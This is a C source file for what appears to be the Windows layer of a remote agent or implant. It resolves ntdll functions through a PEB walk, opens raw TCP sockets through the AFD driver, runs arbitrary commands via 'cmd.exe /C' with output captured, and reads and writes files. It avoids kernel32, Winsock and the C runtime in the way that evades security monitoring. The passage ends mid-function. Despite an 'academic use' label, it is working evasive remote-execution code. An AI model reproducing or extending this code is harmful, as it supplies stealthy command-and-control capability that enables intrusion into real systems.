/* ==========================================================================
 * pal_win32.c — Platform Abstraction Layer (Windows) — SYSCALL EDITION
 * ==========================================================================
 * Pure ntdll.dll implementation of the PAL interface defined in pal.h.
 * Every system interaction goes through the NT native API function
 * pointers resolved from ntdll.dll via PEB walk + PE export parsing.
 * NO higher-level libraries are called:
 *
 *   - No CRT        (printf, fprintf, fopen, fread, fwrite, malloc, free)
 *   - No kernel32   (CreateProcessA, CreatePipe, ReadFile, WriteFile,
 *                    Sleep, ExitProcess, GetComputerName, GetModuleFileName)
 *   - No ws2_32     (WSAStartup, socket, connect, send, recv, closesocket)
 *   - No ucrtbase   (memset, memcpy, strlen, strcmp, snprintf, time)
 *
 * All replaced by:
 *   - syscall_win32.h : NT API function pointers (NtCreateFile, NtReadFile,
 *                       NtDeviceIoControlFile for sockets via AFD, etc.)
 *   - nolibc.h        : _nc_memset, _nc_memcpy, _nc_strlen, _nc_snprintf, ...
 *   - nt_malloc/nt_free : VirtualMemory-based allocator from syscall_win32.h
 *
 * Sockets are implemented via the AFD (Ancillary Function Driver) interface:
 *   1. NtCreateFile on \Device\Afd\Endpoint — creates a socket handle
 *   2. NtDeviceIoControlFile(AFD_BIND) — binds to local address
 *   3. NtDeviceIoControlFile(AFD_CONNECT) — connects to remote
 *   4. NtDeviceIoControlFile(AFD_SEND/AFD_RECV) — send/receive data
 *   5. NtClose — closes the socket handle
 *
 * ACADEMIC/EDUCATIONAL USE ONLY.
 * ========================================================================== */

#ifdef _WIN32

#include "pal.h"
#include "config.h"
#include "syscall_win32.h"
#include "nolibc.h"

/* ---- Platform initialisation ------------------------------------------ */

int pal_init(void)
{
    /* Resolve all ntdll function pointers via PEB walk.
     * This is the only "bootstrapping" needed — no WSAStartup,
     * no CRT init, no DLL loading.  ntdll.dll is always mapped
     * into every Windows process by the kernel loader. */
    if (nt_syscall_init() != 0) {
        /* Can't even log yet — syscall table not ready.
         * Write a fixed string to stderr via the one syscall
         * we can call directly. */
        return -1;
    }
    return 0;
}

void pal_cleanup(void)
{
    /* Nothing to clean up.  No WSACleanup, no CRT teardown. */
}

/* ---- Internal: Write to stderr via NtWriteFile ------------------------ */

/* Get the stderr handle from the PEB → ProcessParameters */
static NT_HANDLE _pal_get_stderr(void)
{
    NT_PEB *peb = _nt_get_peb();
    if (peb && peb->ProcessParameters) {
        return peb->ProcessParameters->StandardError;
    }
    return NT_INVALID_HANDLE;
}

static void _pal_write_stderr(const char *buf, size_t len)
{
    NT_HANDLE hStderr = _pal_get_stderr();
    if (hStderr == NT_INVALID_HANDLE || hStderr == NT_NULL_HANDLE) return;
    if (!g_nt.NtWriteFile) return;

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    g_nt.NtWriteFile(hStderr, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0,
                     &iosb, (NT_PVOID)buf, (NT_ULONG)len,
                     (NT_LARGE_INTEGER *)0, (NT_PVOID)0);
}

/* ---- Sockets (via AFD driver) ----------------------------------------- */

/*
 * Windows sockets at the NT level work through the AFD (Ancillary Function
 * Driver).  The flow is:
 *
 * 1. Create socket: NtCreateFile on \Device\Afd\Endpoint with Extended
 *    Attributes encoding the address family, socket type, and protocol.
 *
 * 2. Bind: NtDeviceIoControlFile with AFD_BIND IOCTL.
 *
 * 3. Connect: NtDeviceIoControlFile with AFD_CONNECT IOCTL.
 *
 * 4. Send/Recv: NtDeviceIoControlFile with AFD_SEND/AFD_RECV IOCTLs.
 *
 * 5. Close: NtClose on the AFD handle.
 */

/* EA name for AFD endpoint creation */
static const char AFD_OPEN_PACKET_NAME[] = "AfdOpenPacketXX";
#define AFD_OPEN_PACKET_NAME_LENGTH 15

/* Transport name for TCP */
static const NT_WCHAR AFD_TCP_TRANSPORT[] = L"\\Device\\Tcp";
#define AFD_TCP_TRANSPORT_CHARS 11

int pal_socket_create(void)
{
    if (!g_nt.NtCreateFile || !g_nt.RtlInitUnicodeString) {
        return -1;
    }

    /* Build the EA buffer for AFD socket creation.
     * Layout: NT_FILE_FULL_EA_INFORMATION header + EA name + AFD_OPEN_PACKET */

    /* Calculate sizes */
    size_t transport_bytes = (AFD_TCP_TRANSPORT_CHARS + 1) * sizeof(NT_WCHAR);
    size_t open_packet_size = sizeof(AFD_OPEN_PACKET) - sizeof(NT_WCHAR) + transport_bytes;
    size_t ea_total = sizeof(NT_FILE_FULL_EA_INFORMATION) - 1
                    + AFD_OPEN_PACKET_NAME_LENGTH + 1
                    + open_packet_size;

    /* Use stack buffer — EA is small enough */
    uint8_t ea_buf[256];
    _nc_memset(ea_buf, 0, sizeof(ea_buf));

    NT_FILE_FULL_EA_INFORMATION *ea = (NT_FILE_FULL_EA_INFORMATION *)ea_buf;
    ea->NextEntryOffset = 0;
    ea->Flags = 0;
    ea->EaNameLength = AFD_OPEN_PACKET_NAME_LENGTH;
    ea->EaValueLength = (NT_USHORT)open_packet_size;

    /* Copy EA name (after the single EaName[1] byte in the struct) */
    _nc_memcpy(ea->EaName, AFD_OPEN_PACKET_NAME, AFD_OPEN_PACKET_NAME_LENGTH + 1);

    /* Fill the AFD open packet (immediately after the EA name + NUL) */
    AFD_OPEN_PACKET *afd_packet = (AFD_OPEN_PACKET *)
        (ea->EaName + AFD_OPEN_PACKET_NAME_LENGTH + 1);

    afd_packet->afdFlags = 0;
    afd_packet->groupID = 0;
    afd_packet->addressFamily = NT_AF_INET;
    afd_packet->socketType = NT_SOCK_STREAM;
    afd_packet->protocol = NT_IPPROTO_TCP;
    afd_packet->sizeOfTransportName = (NT_ULONG)transport_bytes;
    _nc_memcpy(afd_packet->transportName, AFD_TCP_TRANSPORT, transport_bytes);

    /* Open \Device\Afd\Endpoint */
    NT_UNICODE_STRING afd_name;
    NT_WCHAR afd_path[] = L"\\Device\\Afd\\Endpoint";
    g_nt.RtlInitUnicodeString(&afd_name, afd_path);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &afd_name, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    NT_HANDLE sock_handle;
    NT_NTSTATUS status = g_nt.NtCreateFile(
        &sock_handle,
        NT_SYNCHRONIZE | NT_GENERIC_READ | NT_GENERIC_WRITE,
        &oa,
        &iosb,
        (NT_LARGE_INTEGER *)0,
        0,                          /* FileAttributes */
        NT_FILE_SHARE_READ | NT_FILE_SHARE_WRITE,
        NT_FILE_OPEN_IF,
        0,                          /* CreateOptions */
        ea_buf,
        (NT_ULONG)ea_total
    );

    if (!NT_SUCCESS(status)) {
        pal_log("AFD socket create failed (0x%x)", (unsigned int)status);
        return -1;
    }

    /* Return the handle as an int (safe on 64-bit since AFD handles
     * are kernel handle table indices, always < 2^24). */
    return (int)(NT_ULONG_PTR)sock_handle;
}

int pal_socket_connect(int sock, const char *host, uint16_t port)
{
    if (!g_nt.NtDeviceIoControlFile) {
        return -1;
    }

    NT_HANDLE h = (NT_HANDLE)(NT_ULONG_PTR)(unsigned int)sock;

    /* First, bind to INADDR_ANY:0 — AFD requires bind before connect */
    AFD_BIND_INFO bind_info;
    _nc_memset(&bind_info, 0, sizeof(bind_info));
    bind_info.ShareType = 2; /* Shared */
    bind_info.Address.sin_family = NT_AF_INET;
    bind_info.Address.sin_port = 0;
    bind_info.Address.sin_addr = 0; /* INADDR_ANY */

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    NT_NTSTATUS status = g_nt.NtDeviceIoControlFile(
        h, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0, &iosb,
        AFD_BIND,
        &bind_info, sizeof(bind_info),
        &bind_info, sizeof(bind_info)
    );

    if (!NT_SUCCESS(status)) {
        pal_log("AFD bind failed (0x%x)", (unsigned int)status);
        return -1;
    }

    /* Build connect info */
    AFD_CONNECT_INFO conn_info;
    _nc_memset(&conn_info, 0, sizeof(conn_info));
    conn_info.UseSAN = 0;
    conn_info.Root = 0;
    conn_info.Unknown = 0;
    conn_info.RemoteAddress.sin_family = NT_AF_INET;
    conn_info.RemoteAddress.sin_port = _nt_htons(port);

    if (_nt_inet_pton4(host, &conn_info.RemoteAddress.sin_addr) != 0) {
        pal_log("invalid address: %s", host);
        return -1;
    }

    _nc_memset(&iosb, 0, sizeof(iosb));

    status = g_nt.NtDeviceIoControlFile(
        h, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0, &iosb,
        AFD_CONNECT,
        &conn_info, sizeof(conn_info),
        (NT_PVOID)0, 0
    );

    if (!NT_SUCCESS(status)) {
        pal_log("AFD connect failed (0x%x)", (unsigned int)status);
        return -1;
    }

    return 0;
}

int pal_socket_send(int sock, const void *buf, size_t len)
{
    if (!g_nt.NtDeviceIoControlFile) {
        return -1;
    }

    NT_HANDLE h = (NT_HANDLE)(NT_ULONG_PTR)(unsigned int)sock;
    const uint8_t *ptr = (const uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        AFD_WSABUF wsa_buf;
        wsa_buf.buf = (NT_PVOID)ptr;
        wsa_buf.len = (NT_ULONG)(remaining > 0x7FFFFFFF ? 0x7FFFFFFF : remaining);

        AFD_SEND_INFO send_info;
        send_info.BufferArray = &wsa_buf;
        send_info.BufferCount = 1;
        send_info.AfdFlags = AFD_SEND_FLAGS_NONE;
        send_info.TdiFlags = 0;

        NT_IO_STATUS_BLOCK iosb;
        _nc_memset(&iosb, 0, sizeof(iosb));

        NT_NTSTATUS status = g_nt.NtDeviceIoControlFile(
            h, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0, &iosb,
            AFD_SEND,
            &send_info, sizeof(send_info),
            (NT_PVOID)0, 0
        );

        if (!NT_SUCCESS(status)) {
            pal_log("AFD send failed (0x%x)", (unsigned int)status);
            return -1;
        }

        size_t sent = (size_t)iosb.Information;
        if (sent == 0) {
            pal_log("AFD send returned 0 bytes");
            return -1;
        }
        ptr += sent;
        remaining -= sent;
    }

    return 0;
}

int pal_socket_recv(int sock, void *buf, size_t len)
{
    if (!g_nt.NtDeviceIoControlFile) {
        return -1;
    }

    NT_HANDLE h = (NT_HANDLE)(NT_ULONG_PTR)(unsigned int)sock;
    uint8_t *ptr = (uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        AFD_WSABUF wsa_buf;
        wsa_buf.buf = (NT_PVOID)ptr;
        wsa_buf.len = (NT_ULONG)(remaining > 0x7FFFFFFF ? 0x7FFFFFFF : remaining);

        AFD_RECV_INFO recv_info;
        recv_info.BufferArray = &wsa_buf;
        recv_info.BufferCount = 1;
        recv_info.AfdFlags = 0;
        recv_info.TdiFlags = TDI_RECEIVE_NORMAL;

        NT_IO_STATUS_BLOCK iosb;
        _nc_memset(&iosb, 0, sizeof(iosb));

        NT_NTSTATUS status = g_nt.NtDeviceIoControlFile(
            h, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0, &iosb,
            AFD_RECV,
            &recv_info, sizeof(recv_info),
            (NT_PVOID)0, 0
        );

        if (!NT_SUCCESS(status)) {
            if (status == NT_STATUS_END_OF_FILE ||
                status == NT_STATUS_PIPE_BROKEN) {
                pal_log("connection closed by peer");
            } else {
                pal_log("AFD recv failed (0x%x)", (unsigned int)status);
            }
            return -1;
        }

        size_t received = (size_t)iosb.Information;
        if (received == 0) {
            pal_log("connection closed by peer");
            return -1;
        }
        ptr += received;
        remaining -= received;
    }

    return 0;
}

void pal_socket_close(int sock)
{
    if (sock >= 0 && g_nt.NtClose) {
        NT_HANDLE h = (NT_HANDLE)(NT_ULONG_PTR)(unsigned int)sock;
        g_nt.NtClose(h);
    }
}

/* ---- Process execution ------------------------------------------------ */

/*
 * Process spawning via NT native API.
 *
 * Strategy:
 *   1. Create an anonymous pipe via NtCreateNamedPipeFile + NtOpenFile
 *   2. Build process parameters via RtlCreateProcessParametersEx
 *   3. Spawn the child via NtCreateUserProcess
 *   4. Read output from the pipe via NtReadFile
 *   5. Wait for exit via NtWaitForSingleObject
 *   6. Query exit code via NtQueryInformationProcess
 */

/* Create a one-shot anonymous pipe.
 * Returns 0 on success, -1 on failure.
 * On success, *read_handle and *write_handle are set. */
static int _pal_create_pipe(NT_HANDLE *read_handle, NT_HANDLE *write_handle)
{
    if (!g_nt.NtCreateNamedPipeFile || !g_nt.NtCreateFile) {
        return -1;
    }

    /* We create a named pipe with a unique name in the \Device\NamedPipe
     * namespace using a counter for uniqueness. */
    static volatile long pipe_counter = 0;

    /* Generate a unique pipe name */
    NT_WCHAR pipe_name[128];
    NT_WCHAR prefix[] = L"\\Device\\NamedPipe\\__pal_pipe_";

    /* Copy prefix */
    size_t pos = 0;
    for (size_t i = 0; prefix[i]; i++) {
        pipe_name[pos++] = prefix[i];
    }

    /* Append counter as hex (simple uniqueness) */
    long counter;
#ifdef _MSC_VER
    counter = _InterlockedIncrement(&pipe_counter);
#else
    counter = __sync_add_and_fetch(&pipe_counter, 1);
#endif

    /* Also mix in something from the PEB for more uniqueness */
    uintptr_t uniq = (uintptr_t)_nt_get_peb() ^ (uintptr_t)counter;
    char hex[17];
    char *h = _nc_u32_to_hex((uint32_t)uniq, hex, sizeof(hex));
    while (*h && pos < 120) {
        pipe_name[pos++] = (NT_WCHAR)*h;
        h++;
    }
    pipe_name[pos] = 0;

    NT_UNICODE_STRING pipe_ustr;
    g_nt.RtlInitUnicodeString(&pipe_ustr, pipe_name);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &pipe_ustr, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    /* Set up security for handle inheritance */
    oa.Attributes |= NT_OBJ_INHERIT;

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    NT_LARGE_INTEGER timeout;
    timeout.QuadPart = -300000000LL; /* 30 seconds in 100ns units, negative = relative */

    /* Create the server (read) end of the pipe */
    NT_NTSTATUS status = g_nt.NtCreateNamedPipeFile(
        read_handle,
        NT_SYNCHRONIZE | NT_GENERIC_READ | NT_FILE_WRITE_ATTRIBUTES,
        &oa,
        &iosb,
        NT_FILE_SHARE_READ | NT_FILE_SHARE_WRITE,
        NT_FILE_CREATE,         /* CreateDisposition */
        NT_FILE_SYNCHRONOUS_IO_NONALERT,
        0,                      /* NamedPipeType: byte stream */
        0,                      /* ReadMode: byte stream */
        0,                      /* CompletionMode: blocking */
        1,                      /* MaximumInstances */
        4096,                   /* InboundQuota */
        4096,                   /* OutboundQuota */
        &timeout
    );

    if (!NT_SUCCESS(status)) {
        pal_log("pipe create failed (0x%x)", (unsigned int)status);
        return -1;
    }

    /* Open the client (write) end of the pipe */
    NT_OBJECT_ATTRIBUTES oa_write;
    _nt_init_object_attributes(&oa_write, &pipe_ustr,
                               NT_OBJ_CASE_INSENSITIVE | NT_OBJ_INHERIT,
                               NT_NULL_HANDLE);

    _nc_memset(&iosb, 0, sizeof(iosb));

    status = g_nt.NtCreateFile(
        write_handle,
        NT_SYNCHRONIZE | NT_GENERIC_WRITE | NT_FILE_READ_ATTRIBUTES,
        &oa_write,
        &iosb,
        (NT_LARGE_INTEGER *)0,
        0,
        NT_FILE_SHARE_READ | NT_FILE_SHARE_WRITE,
        NT_FILE_OPEN,
        NT_FILE_SYNCHRONOUS_IO_NONALERT | NT_FILE_NON_DIRECTORY_FILE,
        (NT_PVOID)0, 0
    );

    if (!NT_SUCCESS(status)) {
        pal_log("pipe open write end failed (0x%x)", (unsigned int)status);
        g_nt.NtClose(*read_handle);
        return -1;
    }

    return 0;
}

/* PS_CREATE_INFO structure for NtCreateUserProcess */
typedef struct _PS_CREATE_INFO {
    NT_SIZE_T Size;
    NT_ULONG  State;     /* PsCreateInitialState = 0 */
    union {
        struct {
            /* InitFlags */ NT_ULONG InitFlags;
            /* ... more */ NT_ACCESS_MASK AdditionalFileAccess;
        } InitState;
        struct {
            NT_HANDLE FileHandle;
            NT_HANDLE SectionHandle;
            uint64_t  UserProcessParametersNative;
            NT_ULONG  CurrentParameterFlags;
            uint64_t  PebAddressNative;
            uint64_t  ManifestAddress;
            NT_ULONG  ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO;

/* PS_ATTRIBUTE for NtCreateUserProcess attribute list */
typedef struct _PS_ATTRIBUTE {
    NT_ULONG_PTR Attribute;
    NT_SIZE_T    Size;
    union {
        NT_ULONG_PTR Value;
        NT_PVOID     ValuePtr;
    };
    NT_SIZE_T   *ReturnLength;
} PS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    NT_SIZE_T    TotalLength;
    PS_ATTRIBUTE Attributes[2]; /* We need at most 2 attributes */
} PS_ATTRIBUTE_LIST;

/* PS_ATTRIBUTE numbers */
#define PS_ATTRIBUTE_IMAGE_NAME     0x00020005UL
#define PS_ATTRIBUTE_CLIENT_ID      0x00010003UL

int pal_spawn_process(const char *cmd, char *out_buf, size_t out_size,
                      int *exit_code)
{
    if (cmd == (const char *)0 || out_buf == (char *)0 ||
        exit_code == (int *)0) {
        return -1;
    }

    /* Ensure syscall table is ready */
    if (!g_nt.NtCreateFile || !g_nt.NtReadFile ||
        !g_nt.RtlCreateProcessParametersEx) {
        *exit_code = -1;
        return -1;
    }

    /* Create a pipe for stdout/stderr capture */
    NT_HANDLE hReadPipe, hWritePipe;
    if (_pal_create_pipe(&hReadPipe, &hWritePipe) != 0) {
        *exit_code = -1;
        return -1;
    }

    /* Build the command line: "cmd.exe /C <command>"
     * Image path: \??\C:\Windows\System32\cmd.exe */

    /* Convert the command to wide chars */
    NT_WCHAR cmd_wide[4096];
    NT_WCHAR cmd_prefix[] = L"cmd.exe /C ";
    size_t prefix_len = _nt_wcslen(cmd_prefix);

    _nc_memcpy(cmd_wide, cmd_prefix, prefix_len * sizeof(NT_WCHAR));
    _nt_ascii_to_wide(cmd_wide + prefix_len, cmd,
                      sizeof(cmd_wide) / sizeof(NT_WCHAR) - prefix_len);

    /* Image path */
    NT_WCHAR image_path[] = L"\\??\\C:\\Windows\\System32\\cmd.exe";

    NT_UNICODE_STRING uImagePath, uCommandLine;
    g_nt.RtlInitUnicodeString(&uImagePath, image_path);
    g_nt.RtlInitUnicodeString(&uCommandLine, cmd_wide);

    /* Create process parameters */
    NT_RTL_USER_PROCESS_PARAMETERS *params = (NT_RTL_USER_PROCESS_PARAMETERS *)0;

    NT_NTSTATUS status = g_nt.RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        (NT_UNICODE_STRING *)0,     /* DllPath */
        (NT_UNICODE_STRING *)0,     /* CurrentDirectory */
        &uCommandLine,
        (NT_PVOID)0,                /* Environment */
        (NT_UNICODE_STRING *)0,     /* WindowTitle */
        (NT_UNICODE_STRING *)0,     /* DesktopInfo */
        (NT_UNICODE_STRING *)0,     /* ShellInfo */
        (NT_UNICODE_STRING *)0,     /* RuntimeData */
        0x01                        /* RTL_USER_PROC_PARAMS_NORMALIZED */
    );

    if (!NT_SUCCESS(status) || !params) {
        pal_log("RtlCreateProcessParametersEx failed (0x%x)",
                (unsigned int)status);
        g_nt.NtClose(hReadPipe);
        g_nt.NtClose(hWritePipe);
        *exit_code = -1;
        return -1;
    }

    /* Redirect stdout and stderr to the write end of our pipe */
    params->StandardInput = NT_INVALID_HANDLE;
    params->StandardOutput = hWritePipe;
    params->StandardError = hWritePipe;

    /* Set up NtCreateUserProcess */
    PS_CREATE_INFO create_info;
    _nc_memset(&create_info, 0, sizeof(create_info));
    create_info.Size = sizeof(create_info);

    /* Attributes list — we need the image name */
    NT_UNICODE_STRING ntImagePath;
    g_nt.RtlInitUnicodeString(&ntImagePath, image_path);

    PS_ATTRIBUTE_LIST attr_list;
    _nc_memset(&attr_list, 0, sizeof(attr_list));
    attr_list.TotalLength = sizeof(PS_ATTRIBUTE_LIST)
                          - sizeof(PS_ATTRIBUTE); /* Only 1 attribute used */
    attr_list.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attr_list.Attributes[0].Size = ntImagePath.Length;
    attr_list.Attributes[0].ValuePtr = ntImagePath.Buffer;
    attr_list.Attributes[0].ReturnLength = (NT_SIZE_T *)0;

    NT_HANDLE hProcess = NT_NULL_HANDLE;
    NT_HANDLE hThread = NT_NULL_HANDLE;

    status = g_nt.NtCreateUserProcess(
        &hProcess,
        &hThread,
        NT_PROCESS_ALL_ACCESS,
        NT_THREAD_ALL_ACCESS,
        (NT_OBJECT_ATTRIBUTES *)0,  /* ProcessObjectAttributes */
        (NT_OBJECT_ATTRIBUTES *)0,  /* ThreadObjectAttributes */
        0,                          /* ProcessFlags */
        0,                          /* ThreadFlags */
        params,
        &create_info,
        &attr_list
    );

    /* Clean up process parameters */
    g_nt.RtlDestroyProcessParameters(params);

    /* Close the write end of the pipe in this process */
    g_nt.NtClose(hWritePipe);

    if (!NT_SUCCESS(status)) {
        pal_log("NtCreateUserProcess failed (0x%x)", (unsigned int)status);
        g_nt.NtClose(hReadPipe);
        *exit_code = -1;
        return -1;
    }

    /* Read child output from the pipe */
    size_t total = 0;
    while (total < out_size - 1) {
        NT_IO_STATUS_BLOCK iosb;
        _nc_memset(&iosb, 0, sizeof(iosb));

        NT_ULONG to_read = (NT_ULONG)(out_size - 1 - total);
        if (to_read > 4096) to_read = 4096;

        status = g_nt.NtReadFile(
            hReadPipe, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0,
            &iosb,
            out_buf + total, to_read,
            (NT_LARGE_INTEGER *)0, (NT_PVOID)0
        );

        if (!NT_SUCCESS(status) || iosb.Information == 0) {
            break;
        }
        total += (size_t)iosb.Information;
    }
    out_buf[total] = '\0';

    g_nt.NtClose(hReadPipe);

    /* Wait for process to exit */
    g_nt.NtWaitForSingleObject(hProcess, 0, (NT_LARGE_INTEGER *)0);

    /* Query exit code via NtQueryInformationProcess */
    if (g_nt.NtQueryInformationProcess) {
        /* ProcessBasicInformation → ExitStatus */
        struct {
            NT_NTSTATUS ExitStatus;
            NT_PVOID    PebBaseAddress;
            NT_ULONG_PTR AffinityMask;
            NT_LONG     BasePriority;
            NT_ULONG_PTR UniqueProcessId;
            NT_ULONG_PTR InheritedFromUniqueProcessId;
        } pbi;
        _nc_memset(&pbi, 0, sizeof(pbi));

        NT_ULONG ret_len = 0;
        status = g_nt.NtQueryInformationProcess(
            hProcess, NT_ProcessBasicInformation,
            &pbi, sizeof(pbi), &ret_len);

        if (NT_SUCCESS(status)) {
            *exit_code = (int)pbi.ExitStatus;
        } else {
            *exit_code = -1;
        }
    } else {
        *exit_code = -1;
    }

    g_nt.NtClose(hThread);
    g_nt.NtClose(hProcess);

    return 0;
}

/* ---- File I/O --------------------------------------------------------- */

/*
 * File I/O uses NtCreateFile / NtReadFile / NtWriteFile / NtQueryInformationFile.
 * We convert DOS paths to NT paths using \??\ prefix.
 */

int pal_read_file(const char *path, uint8_t **buf, size_t *size)
{
    if (path == (const char *)0 || buf == (uint8_t **)0 ||
        size == (size_t *)0) {
        return -1;
    }

    /* Convert path to wide chars with NT prefix */
    NT_WCHAR dos_path[512];
    _nt_ascii_to_wide(dos_path, path, 512);

    NT_WCHAR nt_path[520];
    _nt_dos_to_nt_path(nt_path, dos_path, 520);

    NT_UNICODE_STRING upath;
    g_nt.RtlInitUnicodeString(&upath, nt_path);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &upath, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    /* Open the file read-only */
    NT_HANDLE hFile;
    NT_NTSTATUS status = g_nt.NtCreateFile(
        &hFile,
        NT_SYNCHRONIZE | NT_FILE_READ_DATA | NT_FILE_READ_ATTRIBUTES,
        &oa,
        &iosb,
        (NT_LARGE_INTEGER *)0,
        0,                          /* FileAttributes */
        NT_FILE_SHARE_READ | NT_FILE_SHARE_WRITE | NT_FILE_SHARE_DELETE,
        NT_FILE_OPEN,
        NT_FILE_SYNCHRONOUS_IO_NONALERT | NT_FILE_NON_DIRECTORY_FILE,
        (NT_PVOID)0, 0
    );

    if (!NT_SUCCESS(status)) {
        pal_log("open failed: %s (0x%x)", path, (unsigned int)status);
        return -1;
    }

    /* Query file size via NtQueryInformationFile(FileStandardInformation) */
    NT_FILE_STANDARD_INFORMATION std_info;
    _nc_memset(&std_info, 0, sizeof(std_info));
    _nc_memset(&iosb, 0, sizeof(iosb));

    status = g_nt.NtQueryInformationFile(
        hFile, &iosb, &std_info, sizeof(std_info),
        NT_FileStandardInformation
    );

    if (!NT_SUCCESS(status)) {
        pal_log("query file info failed (0x%x)", (unsigned int)status);
        g_nt.NtClose(hFile);
        return -1;
    }

    int64_t file_size = std_info.EndOfStream.QuadPart;

    if ((size_t)file_size > MAX_FILE_SIZE) {
        pal_log("file too large: %ld bytes (max %d)",
                (long)file_size, MAX_FILE_SIZE);
        g_nt.NtClose(hFile);
        return -1;
    }

    *buf = (uint8_t *)nt_malloc((size_t)file_size);
    if (*buf == (uint8_t *)0) {
        g_nt.NtClose(hFile);
        return -1;
    }

    /* Read the entire file */
    size_t total = 0;
    while (total < (size_t)file_size) {
        _nc_memset(&iosb, 0, sizeof(iosb));

        NT_ULONG to_read = (NT_ULONG)((size_t)file_size - total);
        if (to_read > 65536) to_read = 65536;

        status = g_nt.NtReadFile(
            hFile, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0,
            &iosb,
            *buf + total, to_read,
            (NT_LARGE_INTEGER *)0, (NT_PVOID)0
        );

        if (!NT_SUCCESS(status) || iosb.Information == 0) {
            break;
        }
        total += (size_t)iosb.Information;
    }

    g_nt.NtClose(hFile);

    if (total != (size_t)file_size) {
        nt_free(*buf);
        *buf = (uint8_t *)0;
        return -1;
    }

    *size = (size_t)file_size;
    return 0;
}

int pal_write_file(const char *path, const uint8_t *buf, size_t size)
{
    if (path == (const char *)0 || (buf == (const uint8_t *)0 && size > 0)) {
        return -1;
    }

    /* Convert path to wide chars with NT prefix */
    NT_WCHAR dos_path[512];
    _nt_ascii_to_wide(dos_path, path, 512);

    NT_WCHAR nt_path[520];
    _nt_dos_to_nt_path(nt_path, dos_path, 520);

    NT_UNICODE_STRING upath;
    g_nt.RtlInitUnicodeString(&upath, nt_path);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &upath, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    /* Create/overwrite the file */
    NT_HANDLE hFile;
    NT_NTSTATUS status = g_nt.NtCreateFile(
        &hFile,
        NT_SYNCHRONIZE | NT_FILE_WRITE_DATA | NT_FILE_WRITE_ATTRIBUTES,
        &oa,
        &iosb,
        (NT_LARGE_INTEGER *)0,
        0,                          /* FileAttributes: normal */
        0,                          /* ShareAccess: exclusive */
        NT_FILE_OVERWRITE_IF,       /* Create or overwrite */
        NT_FILE_SYNCHRONOUS_IO_NONALERT | NT_FILE_NON_DIRECTORY_FILE,
        (NT_PVOID)0, 0
    );

    if (!NT_SUCCESS(status)) {
        pal_log("open for write failed: %s (0x%x)", path, (unsigned int)status);
        return -1;
    }

    if (size > 0) {
        size_t total = 0;
        while (total < size) {
            _nc_memset(&iosb, 0, sizeof(iosb));

            NT_ULONG to_write = (NT_ULONG)(size - total);
            if (to_write > 65536) to_write = 65536;

            status = g_nt.NtWriteFile(
                hFile, NT_NULL_HANDLE, (NT_PVOID)0, (NT_PVOID)0,
                &iosb,
                (NT_PVOID)(buf + total), to_write,
                (NT_LARGE_INTEGER *)0, (NT_PVOID)0
            );

            if (!NT_SUCCESS(status)) {
                pal_log("write failed (0x%x)", (unsigned int)status);
                g_nt.NtClose(hFile);
                return -1;
            }

            if (iosb.Information == 0) {
                pal_log("write returned 0 bytes");
                g_nt.NtClose(hFile);
                return -1;
            }
            total += (size_t)iosb.Information;
        }
    }

    g_nt.NtClose(hFile);
    return 0;
}

/* ---- Time ------------------------------------------------------------- */

int64_t pal_time_unix(void)
{
    if (!g_nt.NtQuerySystemTime) return 0;

    NT_LARGE_INTEGER sys_time;
    NT_NTSTATUS status = g_nt.NtQuerySystemTime(&sys_time);
    if (!NT_SUCCESS(status)) return 0;

    /* Windows FILETIME epoch: Jan 1, 1601.
     * Unix epoch: Jan 1, 1970.
     * Difference: 11644473600 seconds = 116444736000000000 in 100ns units. */
    int64_t unix_100ns = sys_time.QuadPart - 116444736000000000LL;
    return unix_100ns / 10000000LL; /* Convert 100ns → seconds */
}

void pal_sleep_ms(uint32_t ms)
{
    if (!g_nt.NtDelayExecution) return;

    /* NtDelayExecution takes a negative value for relative time,
     * in 100-nanosecond units. */
    NT_LARGE_INTEGER delay;
    delay.QuadPart = -(int64_t)ms * 10000LL;

    g_nt.NtDelayExecution(0, &delay);
}

/* ---- Process control -------------------------------------------------- */

void pal_exit(int code)
{
    if (g_nt.NtTerminateProcess) {
        g_nt.NtTerminateProcess(NT_CURRENT_PROCESS, (NT_NTSTATUS)code);
    }
    /* If NtTerminateProcess fails or isn't resolved, infinite loop
     * to prevent undefined behaviour. */
    for (;;) { }
}

/* ---- System information ----------------------------------------------- */

int pal_get_hostname(char *buf, size_t size)
{
    if (buf == (char *)0 || size == 0) {
        return -1;
    }

    /* Read hostname from the registry via NtOpenKey + NtQueryValueKey:
     * \Registry\Machine\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
     * Value: "Hostname" */
    if (g_nt.NtOpenKey && g_nt.NtQueryValueKey) {
        NT_WCHAR reg_path[] =
